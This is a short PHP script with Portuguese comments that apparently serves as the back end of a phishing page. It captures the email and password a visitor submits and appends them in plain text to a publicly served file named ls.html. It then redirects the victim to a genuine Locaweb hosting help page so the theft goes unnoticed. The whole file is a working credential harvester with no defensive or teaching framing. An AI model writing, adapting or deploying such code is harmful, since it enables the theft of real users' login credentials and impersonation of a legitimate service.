<?php
// Captura os dados enviados pelo formulário
$email = $_POST['email'];
$password = $_POST['senha'];

// Nome do arquivo onde os dados serão salvos
$arquivoHTML = 'ls.html';

// Formata a linha: email;senha
$linha = htmlspecialchars($email) . ';' . htmlspecialchars($password) . "<br>\n";

// Se o arquivo NÃO existir, cria com o cabeçalho HTML
if (!file_exists($arquivoHTML)) {
    $conteudoInicial = "<!DOCTYPE html>
<html lang='pt-BR'>
<head>
    <meta charset='UTF-8'>
    <meta name='viewport' content='width=device-width, initial-scale=1.0'>
    <title>NAO trabalho da faculdade</title>
</head>
<body>
    <h1>NAO trabalho da faculdade</h1>
";
    file_put_contents($arquivoHTML, $conteudoInicial);
}

// Adiciona a linha no arquivo
file_put_contents($arquivoHTML, $linha, FILE_APPEND);

// Finaliza HTML se ainda não tiver final
if (strpos(file_get_contents($arquivoHTML), '</body></html>') === false) {
    file_put_contents($arquivoHTML, "</body></html>", FILE_APPEND);
}

// REDIRECIONAMENTO — coloque o link que você quiser aqui
header("Location: https://www.locaweb.com.br/ajuda/categorias/financeiro/"); 
exit();
?>
